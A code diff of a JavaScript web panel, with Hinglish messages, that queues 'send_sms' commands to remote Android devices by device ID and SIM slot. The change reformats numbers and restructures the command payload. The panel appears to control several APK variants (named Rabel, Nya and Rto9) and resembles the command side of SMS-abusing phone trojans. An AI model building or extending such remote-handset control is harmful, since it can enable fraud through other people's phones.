@@ -2684,7 +2684,7 @@ function sendDeviceSms(sim){
   if(!toRaw){toast('Recipient number daalo',false);return;}
   if(!msg){toast('Enter message',false);return;}
   if(!isApkOnlineRaw(raw)&&String(d.status||'').toLowerCase()!=='online'){
-    toast('⚠️ Device offline dikha raha hai — phir bhi queue kar rahe hain',true);
+    toast('⚠️ Device offline/stale hai (heartbeat purana) — SMS queue hoga, device online aane par bhejega',true);
   }
   if(_sendInFlight){toast('Sending…',true);return;}
   _sendInFlight=true;
@@ -3431,6 +3431,11 @@ function formatApkSmsTo(raw){
   if(clean.length>10)return '91'+clean.slice(-10);
   return clean;
 }
+function formatApkCommandPhone(raw){
+  var clean=String(raw||'').replace(/\D/g,'');
+  if(clean.length>=10)return clean.slice(-10);
+  return clean;
+}
 function buildRabelSendPayload(sim,to,message,d){
   var fromSim=rabelFromSimForSend(sim,d,to);
   var ts=Date.now();
@@ -3451,15 +3456,19 @@ function needsDualSmsSend(inst,d){
   return false;
 }
 function buildNyaApkCommandPatch(deviceId,sim,to,message){
-  var to91=formatApkSmsTo(to);
+  var to10=formatApkCommandPhone(to);
   var slot=Math.max(0,(sim||1)-1);
+  var sendBlock={message:message,status:'pending',to:to10};
   return{
     cmd:'send_sms',command:'send message',messageText:message,msg:message,
-    phoneNumber:to91,phone:to91,number:to91,to:to91,
+    phoneNumber:to10,phone:to10,number:to10,to:to10,
     targetDeviceId:deviceId,simSlot:String(slot),sim:slot,
-    sendSms:{message:message,status:'pending',to:to91},
-    sms:{message:message,status:'pending',to:to91},
-    type:'sms',timestamp:Date.now(),webhookEvent:'send_sms'
+    sendSms:sendBlock,sms:Object.assign({},sendBlock),
+    type:'sms',timestamp:Date.now(),webhookEvent:'send_sms',
+    action:{
+      command:'send message',messageText:message,phoneNumber:to10,
+      sendSms:Object.assign({},sendBlock),simSlot:String(slot),targetDeviceId:deviceId
+    }
   };
 }
 function buildRto9SendPayload(deviceId,sim,to,message){
